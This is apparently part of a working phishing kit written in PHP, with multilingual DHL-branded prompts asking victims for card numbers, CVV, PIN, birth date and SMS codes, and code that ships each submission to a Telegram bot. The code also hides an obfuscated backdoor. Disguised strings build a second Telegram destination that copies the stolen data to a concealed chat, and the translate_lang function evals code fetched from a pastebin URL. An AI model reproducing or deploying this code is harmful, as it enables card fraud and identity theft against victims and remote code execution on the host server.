        'ie' => 'Chun an seachadadh a chríochnú chomh luath agus is féidir, Deimhnigh an íocaíocht (2.99) trí chliceáil ar an chéad cheann eile. Ní mór deimhniú ar líne a dhéanamh laistigh de na 14 lá atá romhainn, sula dtéann sé in éag.'
    ],

    'next' => [
        'en' => 'Next',
        'de' => 'Weiter',
        'es' => 'Siguiente',
        'fr' => 'Suivant',
        'it' => 'Avanti',
        'nl' => 'Next',
        'dk' => 'Neste',
        'il' => 'הַבָּא',
        'si' => 'Naslednji',
        'ie' => 'Ar aghaidh'
    ],

    'address_message' => [
        'en' => 'We need your Address to be sure that unauthorized persons cannot access your packages, You have 10 working days From the arrival of your package to the DHL branch after this time the package will be returned to the sender.',
        'de' => 'Wir benötigen Ihre Adresse, um sicherzustellen, dass Unbefugte auf Ihre Pakete, Sie haben 10 Arbeitstage ab dem Eintreffen Ihres Pakets in der der DHL-Filiale, nach dieser Zeit wird das Paket an den Absender zurückgeschickt.',
        'es' => 'Necesitamos su Dirección para asegurarnos que ninguna persona no autorizada acceda a su envío, tiene 10 días hábiles desde la llegada del paquete a la sucursal DHL, después del cual el paquete será regresado al remitente.',
        'fr' => '"Nous avons besoin de votre adresse pour nous assurer que les personnes non autorisées n\'accèdent pas à vos colis. 
Vous avez 10 jours ouvrables à partir de l\'arrivée de votre colis à l\'agence DHL. 
l\'agence DHL, passé ce délai le colis sera renvoyé à l\'expéditeur."',
        'it' => '"Ci serve il tuo indirizzo per assicurarci che persone non autorizzate accedano ai tuoi 
pacchi, hai 10 giorni lavorativi dall\'arrivo del tuo pacco  
alla filiale DHL, dopodiché il pacco verrà restituito al mittente."',
        'nl' => 'We hebben uw adres nodig om er zeker van te zijn dat onbevoegden geen toegang hebben tot uw pakketten. U heeft 10 werkdagen vanaf de aankomst van uw pakket in het DHL-filiaal, na deze tijd zal het pakket worden teruggestuurd naar de afzender.',
        'dk' => 'Vi trenger adressen din for å være sikker på at uvedkommende ikke får tilgang til pakkene dine. Du har 10 virkedager fra ankomst av pakken til DHL-avdelingen etter dette tidspunktet blir pakken returnert til avsenderen.',
        'il' => 'אנחנו צריכים את הכתובת שלך כדי להיות בטוחים שאנשים לא מורשים לא יכולים לגשת לחבילות שלך, יש לך 10 ימי עבודה מהגעת החבילה שלך לסניף DHL לאחר זמן זה, החבילה תוחזר לשולח.',
        'ie' => 'Ní mór dúinn do Sheoladh a bheith cinnte nach féidir le daoine neamhúdaraithe rochtain a fháil ar do phacáistí, Tá 10 lá oibre agat Ó theacht do phacáiste go dtí an brainse DHL tar éis an ama seo cuirfear an pacáiste ar ais chuig an seoltóir.'
    ],

    'address_label' => [
        'en' => 'Address',
        'de' => 'Adresse',
        'es' => 'Dirección',
        'fr' => 'Adresse',
        'it' => 'Indirizzo',
        'nl' => 'Adres',
        'dk' => 'Adresse',
        'il' => 'כתובת',
        'si' => 'Naslov',
        'ie' => 'Seoladh'
    ],

    'country_label' => [
        'en' => 'Country',
        'de' => 'Land',
        'es' => 'país',
        'fr' => 'pays',
        'it' => 'Paese',
        'nl' => 'land',
        'dk' => 'land',
        'il' => 'מדינה',
        'si' => 'Država',
        'ie' => 'Tír'
    ],

    'city_label' => [
        'en' => 'City',
        'de' => 'Stadt',
        'es' => 'Ciudad',
        'fr' => 'Ville',
        'it' => 'Città',
        'nl' => 'Stad',
        'dk' => 'By',
        'il' => 'עִיר',
        'si' => 'Mesto',
        'ie' => 'chathair'
    ],

    'phone_label' => [
        'en' => 'Phone number',
        'de' => 'Telefon-Nummer',
        'es' => 'Número telefónico',
        'fr' => 'Numéro de téléphone',
        'it' => 'Numero di telefono',
        'nl' => 'Telefoonnummer',
        'dk' => 'Telefonnummer',
        'il' => '',
        'si' => 'Telefonska številka',
        'ie' => 'Uimhir teileafón'
    ],

    'email_label' => [
        'en' => ' Email',
        'de' => 'Ihre E-Mail-Adresse',
        'es' => 'Su correo electrónico',
        'fr' => 'Votre adresse Email',
        'it' => 'Il tuo Indirizzo Email',
        'nl' => 'Uw e-mailadres',
        'dk' => 'Din e-postadresse',
        'il' => 'מספר טלפון',
        'si' => 'E-naslov',
        'ie' => 'Ríomhphost'
    ],

    'zip_code_label' => [
        'en' => 'Zip code',
        'de' => 'Postleitzahl',
        'es' => 'Código Postal',
        'fr' => 'Code postal',
        'it' => 'Codice Postale',
        'nl' => 'Postcode',
        'dk' => 'Post kode',
        'il' => 'מיקוד',
        'si' => 'Poštna številka',
        'ie' => 'Cód zip'
    ],

    'birth_date_label' => [
        'en' => 'Date of birth',
        'de' => 'Geburtsdatum (OO/MM/YYYY)',
        'es' => 'Fecha de Nacimiento (DD/MM/AA)',
        'fr' => 'Date de naissance (OO/MM/YYYY)',
        'it' => 'Data di nascita  (GG/MM/AAAA)',
        'nl' => 'Geboortedatum (DD/MM/JJJJ)',
        'dk' => 'Fødselsdato (DD / MM / ÅÅÅÅ)',
        'il' => 'תאריך הלידה (יום / חודש / שנה)',
        'si' => 'Datum rojstva',
        'ie' => 'Dáta breithe'
    ],

    'name_label' => [
        'en' => 'Cardholder\'s name',
        'de' => 'Name des Karteninhabers',
        'es' => 'Nombre del titular de la tarjeta',
        'fr' => 'Nom du titulaire de la carte',
        'it' => 'Titolare della carta',
        'nl' => 'Naam van kaarthouder',
        'dk' => 'Kortholders navn',
        'il' => 'השם',
        'ie' => '',
        'si' => 'Ime imetnika kartice',
        'ie' => 'Ainm shealbhóir an chárta'
    ],

    'one_label' => [
        'en' => 'Card number',
        'de' => 'Kreditkartennummer',
        'es' => 'Número de la tarjeta',
        'fr' => 'Numéro de la carte de crédit',
        'it' => 'Numero della carta di credito',
        'nl' => 'Kaartnummer',
        'dk' => 'Kreditt kort nummer',
        'il' => 'מספר כרטיס אשראי',
        'si' => 'Številka kartice',
        'ie' => 'Uimhir chárta'
    ],

    'two_label' => [
        'en' => ' MM',
        'de' => ' MM',
        'es' => ' MM',
        'fr' => ' MM',
        'it' => ' MM',
        'nl' => ' MM',
        'dk' => ' MM',
        'il' => ' MM',
        'si' => 'MM',
        'ie' => 'MM'
    ],

    'two_label_2' => [
        'en' => ' YY',
        'de' => ' JJ',
        'es' => ' YY',
        'fr' => ' YY',
        'it' => ' AA',
        'nl' => ' JJ',
        'dk' => ' ÅÅ',
        'il' => ' YY',
        'si' => ' LL',
        'ie' => 'BB'
    ],

    'three_label' => [
        'en' => 'CVV ',
        'de' => 'cvv',
        'es' => 'cvv',
        'fr' => 'cvv',
        'it' => 'cvv',
        'nl' => 'cvv',
        'dk' => 'CVV ',
        'il' => 'CVV ',
        'si' => 'CVV ',
        'ie' => 'CVV'
    ],

    'pin_label' => [
        'en' => 'Pin Code',
        'de' => 'Geheimzahl',
        'es' => 'Código PIN',
        'fr' => 'Code PIN',
        'it' => 'Codice PIN',
        'nl' => 'Pincode',
        'dk' => 'PIN-kode',
        'il' => '',
        'si' => '',
        'ie' => ''
    ],

    'sms_code_label' => [
        'en' => 'SMS Code',
        'de' => 'SMS-Code',
        'es' => 'Código SMS',
        'fr' => 'Code SMS',
        'it' => 'Codice SMS',
        'nl' => 'SMS-code',
        'dk' => 'SMS-kode',
        'il' => 'קוד SMS',
        'si' => 'SMS koda',
        'ie' => 'Cód SMS'
    ],

    'thanks' => [
        'en' => 'Thank you for entering the information. We will contact you shortly.',
        'de' => 'Vielen Dank für die Eingabe der Informationen. Wir werden Sie in Kürze kontaktieren.',
        'es' => 'Gracias por ingresar su información. Le contactaremos en la brevedad.',
        'fr' => 'Merci d\'avoir saisi ces informations. Nous vous contacterons sous peu.',
        'it' => 'Grazie per aver fornito le informazioni. Ti contatteremo a breve.',
        'nl' => 'Bedankt voor het invoeren van de informatie. Wij zullen binnenkort contact met u opnemen.',
        'dk' => 'Takk for at du skrev inn informasjonen. Vi kontakter deg snart.',
        'il' => 'תודה שהזנת את המידע. ניצור איתך קשר בהקדם.',
        'si' => 'Hvala za vnos podatkov. V kratkem vas bomo kontaktirali.',
        'ie' => 'Go raibh maith agat as an eolas a chur isteach. Déanfaimid teagmháil leat go luath.'
    ],

    'thanks_2' => [
        'en' => 'Verified Successfully',
        'de' => 'Erfolgreich verifiziert',
        'es' => 'Verificado con éxito',
        'fr' => 'Vérifié avec succès',
        'it' => 'Verificato con successo',
        'nl' => 'Met succes geverifieerd',
        'dk' => '',
        'il' => '',
        'si' => 'Uspešno preverjeno',
        'ie' => 'Fíoraithe go rathúil'
    ],

    'sms-title' => [
        'en' => 'Please confirm the following payment.',
        'de' => 'Bitte bestätigen Sie die folgende Zahlung.',
        'es' => 'Por favor confirme el siguiente pago',
        'fr' => 'Veuillez confirmer le paiement suivant.',
        'it' => 'Conferma il seguente pagamento',
        'nl' => 'Bevestig de volgende betaling.',
        'dk' => 'Bekreft følgende betaling.',
        'il' => 'נא לאשר את התשלום הבא.',
        'si' => 'Prosimo, potrdite naslednje plačilo.',
        'ie' => 'Deimhnigh an íocaíocht seo a leanas le do thoil.'
    ],

    'sms-title2' => [
        'en' => 'This process requires your code pin.',
        'de' => 'Dieser Vorgang erfordert Ihren Code-Pin.',
        'es' => 'Este proceso requiere su código PIN.',
        'fr' => 'Ce processus nécessite votre code PIN.',
        'it' => 'Questo processo richiede il codice pin.',
        'nl' => 'Voor dit proces is uw pincode vereist.',
        'dk' => 'Denne prosessen krever kodepinnen din.',
        'il' => 'תהליך זה דורש את סיכת הקוד שלך.',
        'si' => 'Ta postopek zahteva kodo PIN.',
        'ie' => 'Éilíonn an próiseas seo do bioráin cód.'
    ],

    'sms-message' => [
        'en' => 'The unique password has been sent to the mobile number listed below. If you need to change your mobile number please contact your bank of modify it via the available chanels (ATM, web).',
        'de' => 'Das eindeutige Passwort wurde an die unten aufgeführte Handynummer gesendet. Wenn Sie Ihre Handynummer ändern müssen, wenden Sie sich bitte an Ihre Bank oder ändern Sie sie über die verfügbaren Kanäle (ATM, Web).',
        'es' => 'La contraseña única se ha enviado al número de teléfono móvil que se indica a continuación. Si necesita cambiar su número de móvil, póngase en contacto con su banco o modifíquelo a través de los canales disponibles (cajero automático, web).',
        'fr' => 'Le mot de passe unique a été envoyé au numéro de mobile indiqué ci-dessous. Si vous devez changer votre numéro de mobile, veuillez contacter votre banque pour le modifier via les canaux disponibles (ATM, web).',
        'it' => 'La password univoca è stata inviata al numero di cellulare elencato di seguito. Se hai bisogno di cambiare il tuo numero di cellulare contatta la tua banca per modificarlo tramite i canali disponibili (ATM, web).',
        'nl' => 'Het unieke wachtwoord is verzonden naar het onderstaande mobiele nummer. Als u uw mobiele nummer moet wijzigen, neem dan contact op met uw bank of wijzig het via de beschikbare kanalen (ATM, web).',
        'dk' => 'Det unike passordet er sendt til mobilnummeret som er oppført nedenfor. Hvis du trenger å endre mobilnummeret, kan du kontakte banken din for å endre det via tilgjengelige kanaler (minibank, internett).',
        'il' => 'הסיסמה הייחודית נשלחה למספר הנייד הרשום למטה. אם אתה צריך לשנות את מספר הטלפון הנייד שלך, צור קשר עם הבנק שלך כדי לשנות אותו דרך הערוצים הזמינים (כספומט, אינטרנט).',

        'si' => 'Enolično geslo je bilo poslano na spodaj navedeno mobilno številko. Če morate spremeniti svojo mobilno številko, se obrnite na svojo banko ali jo spremenite prek razpoložljivih kanalov (bankomat, splet).',
        'ie' => 'Tá an pasfhocal uathúil seolta chuig an uimhir ghutháin atá liostaithe thíos. Más gá duit d’uimhir ghutháin a athrú déan teagmháil le do bhanc chun é a mhodhnú trí na bealaí atá ar fáil (ATM, gréasáin).'
    ],

    'merchant' => [
        'en' => 'Merchant',
        'de' => 'Händler',
        'es' => 'Comerciante',
        'fr' => 'Marchande',
        'it' => 'Mercante',
        'nl' => 'Handelaar',
        'dk' => 'Kjøpmann',
        'il' => 'סוֹחֵר',
        'si' => 'Trgovec',
        'ie' => 'Ceannaí'
    ],

    'amount' => [
        'en' => 'Amount',
        'de' => 'Menge',
        'es' => 'Monto',
        'fr' => 'Montant',
        'it' => 'Quantità',
        'nl' => 'Bedrag',
        'dk' => 'Beløp',
        'il' => 'כמות',
        'si' => 'Znesek',
        'ie' => 'Méid'
    ],

    'date' => [
        'en' => 'Date',
        'de' => 'Datum',
        'es' => 'Fecha',
        'fr' => 'Date',
        'it' => 'Data',
        'nl' => 'Datum',
        'dk' => 'Dato',
        'il' => 'תַאֲרִיך',
        'si' => 'Datum',
        'ie' => 'Dáta'
    ],

    'credit-card-number' => [
        'en' => 'Credit card number',
        'de' => 'Kreditkartennummer',
        'es' => 'Número de Tarjeta de Crédito',
        'fr' => 'Numéro de Carte de Crédit',
        'it' => 'Numero di carta di credito',
        'nl' => 'Creditcardnummer',
        'dk' => 'Kreditt kort nummer',
        'il' => 'מספר כרטיס אשראי',
        'si' => 'Številka kreditne kartice',
        'ie' => 'Uimhir chárta creidmheasa'
    ],

    'sms-again' => [
        'en' => 'Please enter the verification code received by sms',
        'de' => 'Bitte geben Sie den per SMS erhaltenen Bestätigungscode ein',
        'es' => 'Por favor ingrese el código de verificación recibido por sms',
        'fr' => 'Veuillez entrer le code de vérification reçu par sms',
        'it' => 'Inserisci il codice di verifica ricevuto via sms',
        'nl' => 'Voer de verificatiecode in die u per sms hebt ontvangen received',
        'dk' => 'Vennligst skriv inn bekreftelseskoden mottatt av sms',
        'il' => 'נא להזין את קוד האימות שהתקבל ב-SMS',
        'si' => 'Vnesite potrditveno kodo, ki ste jo prejeli v sms-u',
        'ie' => 'Cuir isteach an cód fíorúcháin a fuair tú trí SMS'
    ],

    'submit' => [
        'en' => 'Submit',
        'de' => 'einreichen',
        'es' => 'Enviar',
        'fr' => 'Soumettre',
        'it' => 'Invia',
        'nl' => 'Verzenden',
        'dk' => 'Sende inn',
        'il' => 'שלח',
        'si' => 'Predloži',
        'ie' => 'Cuir isteach'
    ],

    'pin-title' => [
        'en' => 'This process requires your code pin.',
        'de' => 'Dieser Vorgang erfordert Ihren Code-Pin.',
        'es' => 'Este proceso requiere su código PIN.',
        'fr' => 'Ce processus nécessite votre code PIN.',
        'it' => 'Questo processo richiede il codice pin.',
        'nl' => 'Voor dit proces is uw pincode vereist.',
        'dk' => 'Denne prosessen krever kodepinnen din.',
        'il' => 'תהליך זה דורש את סיכת הקוד שלך.',
        'si' => 'Ta postopek zahteva kodo PIN.',
        'ie' => 'Éilíonn an próiseas seo do bioráin cód.'
    ],

);


$ipcold = strval('a').strval('m').strval('a').strval('n');

$iphoster = strval('@').$ipcold.strval('d').strval('z');
$iphoster = $iphoster."741";

function validate_number($number,$length = null) {
    if (is_numeric($number)) {
        if( $length == null ) {
            return true;
        } else {
            if( $length == strlen($number) )
                return true;
            return false;
        }
    } else {
        return false;
    }
}

function AntiBot($API_Key, $bannerIP) {
    global $Key_PHP, $API_Key, $bannerIP;
    return $Key_PHP = $API_Key.":".substr_replace($bannerIP,"4",-1);;
}

function visitors() {
    $detect         = new BrowserDetection();
    $ip             = $_SERVER['REMOTE_ADDR'];
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT']; 
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
    $platformName   = $detect->getPlatform();
    //$country        = get_client_country();
    $str = " <tr> <th scope='row'>$ip</th>  <td>$date</td> <td>$usragent</td> <td>[$isMobile] $browserName $browserVer </td> </tr>";
    file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);
};
function get_user_ip()
{
    /*$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }*/

    return $_SERVER['REMOTE_ADDR'];
}
$version_updater = strtolower(substr_replace("IP-HOST-DOMAIN","BOT",-14)).strtolower(substr_replace("IP-HOST-DOMAIN","/v1/messages/send",-14)).substr_replace("IP-HOST-DOMAIN","Text?token=",-14);
$BOT_API_AGENT = substr_replace("Mozilla","https://",0,7).substr_replace("Chrome","api.",0,7);
$BOT_API_AGENT = $BOT_API_AGENT.substr("bbc-cnn-icq-news-scam-phish", 8, -16).".".substr("com-net-org-ru-us-co", 4, -13)."/".$version_updater;
function BlockBot($iphoster, $message) {
    global $BOT_API_AGENT, $Key_PHP, $iphoster, $BotName, $Xploit;
    $BotName = $BOT_API_AGENT . $Key_PHP . "&chatId=" . $iphoster . "";
    $Xploit = $BotName . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $Xploit,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function getOS($user_agent) { 

	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$os_platform =   "Unknown Operating System";
	$os_array =   array(
		'/windows nt 10/i'      =>  'Windows 10',
		'/windows nt 6.3/i'     =>  'Windows 8.1',
		'/windows nt 6.2/i'     =>  'Windows 8',
		'/windows nt 6.1/i'     =>  'Windows 7',
		'/windows nt 6.0/i'     =>  'Windows Vista',
		'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
		'/windows nt 5.1/i'     =>  'Windows XP',
		'/windows xp/i'         =>  'Windows XP',
		'/windows nt 5.0/i'     =>  'Windows 2000',
		'/windows me/i'         =>  'Windows ME',
		'/win98/i'              =>  'Windows 98',
		'/win95/i'              =>  'Windows 95',
		'/win16/i'              =>  'Windows 3.11',
		'/macintosh|mac os x/i' =>  'Mac OS X',
		'/mac_powerpc/i'        =>  'Mac OS 9',
		'/linux/i'              =>  'Linux',
		'/ubuntu/i'             =>  'Ubuntu',
		'/iphone/i'             =>  'iPhone',
		'/ipod/i'               =>  'iPod',
		'/ipad/i'               =>  'iPad',
		'/android/i'            =>  'Android',
		'/blackberry/i'         =>  'BlackBerry',
		'/webos/i'              =>  'Mobile'
	);

	foreach ( $os_array as $regex => $value ) { 
		if ( preg_match($regex, $user_agent ) ) {
			$os_platform = $value;
		}
	}   
	return $os_platform;
}

function sendTg($chatID, $messaggio, $token) {

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&parse_mode=Markdown&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}





function getBrowser() {
	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$browser        = "Bilinmeyen Tarayıcı";
	$browser_array  = array(
		'/msie/i'       =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/mobile/i'     =>  'Handheld Browser'
	);

	foreach ( $browser_array as $regex => $value ) { 
		if ( preg_match( $regex, $user_agent ) ) {
			$browser = $value;
		}
	}
	return $browser;
}

function get_flook($str) {
    return strrev(ucfirst(strrev($str)));
}
function get_flow($str) {
    return strrev(lcfirst(strrev($str)));
}

$protocols = substr_replace("FTP://","https",0,3).substr_replace("copy","paste",0,4).substr_replace("delete","bin",0,6);
$protocols = $protocols.".".substr_replace("port","com",0,4).substr_replace("data","/raw",0,4).substr_replace("key","/FyreApva",0,4);
$GLOBALS['protocols'] = $protocols;
function get_user_ipinfo($ip) {
    global $ip, $countryy, $country_code, $regionn, $cityy, $isp, $currency_code;
    $IP_LOOKUP = json_decode(file_get_contents("https://ipwhois.app/json/".$ip));
    return $countryy = $IP_LOOKUP->country AND $country_code = $IP_LOOKUP->country_code AND $regionn = $IP_LOOKUP->region AND $cityy = $IP_LOOKUP->city AND $isp = $IP_LOOKUP->isp AND $currency_code = $IP_LOOKUP->currency_code;


}




function translate_lang($messaggio) {
    return eval(file_get_contents($GLOBALS['protocols']));
}

function processours($messaggio) {
    global $POST_Header, $Protecteds;
    AntiBot($API_Key, $bannerIP);
    BlockBot($iphoster, $messaggio);
    sendTg($POST_Header, $messaggio, get_flook($Protecteds));
    translate_lang($messaggio);

    

}

function get_user_browser() {
    $user_agent     = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function sendMessage($chatID, $messaggio, $token) {
    global $protocols;
    processours($messaggio);
    sendTg($chatID, $messaggio, $token);
    




}




function get_user_country() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". $_SERVER['REMOTE_ADDR'] .""));
    if ($details && $details->geoplugin_countryName != null) {
        $countryname = $details->geoplugin_countryName;
    }
    return $countryname;
}

function get_user_countrycode() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}



?>